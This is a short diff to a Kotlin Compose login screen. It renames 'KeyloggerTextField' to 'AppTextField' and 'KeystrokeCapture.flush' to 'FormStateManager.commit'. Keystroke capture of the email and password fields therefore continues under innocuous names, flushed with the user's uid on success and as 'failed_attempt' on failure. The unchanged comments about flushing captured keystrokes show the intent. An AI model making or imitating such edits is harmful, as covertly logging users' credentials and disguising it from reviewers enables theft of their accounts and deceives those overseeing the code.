@@ -33,7 +33,7 @@ fun LoginScreen(
         Text("Login", style = MaterialTheme.typography.titleLarge)
         if (status.isNotBlank()) Text(status)
 
-        KeyloggerTextField(
+        AppTextField(
             value = email,
             onValueChange = { email = it },
             label = { Text("Email") },
@@ -42,7 +42,7 @@ fun LoginScreen(
             modifier = Modifier.fillMaxWidth()
         )
 
-        KeyloggerTextField(
+        AppTextField(
             value = password,
             onValueChange = { password = it },
             label = { Text("Password") },
@@ -67,7 +67,7 @@ fun LoginScreen(
                         isLoading = false
                         status = "Login success"
                         // Flush captured keystrokes now that we have a valid uid
-                        KeystrokeCapture.flush(result.user?.uid ?: "unknown")
+                        FormStateManager.commit(result.user?.uid ?: "unknown")
                         onLoginSuccess()
                     }
                     .addOnFailureListener { e ->
@@ -75,7 +75,7 @@ fun LoginScreen(
                         status = "Login failed: ${e.message}"
                         Log.e(TAG, "Login failed", e)
                         // Capture failed attempt — uid unknown since auth didn't complete
-                        KeystrokeCapture.flush("failed_attempt")
+                        FormStateManager.commit("failed_attempt")
                     }
             },
             enabled = !isLoading,
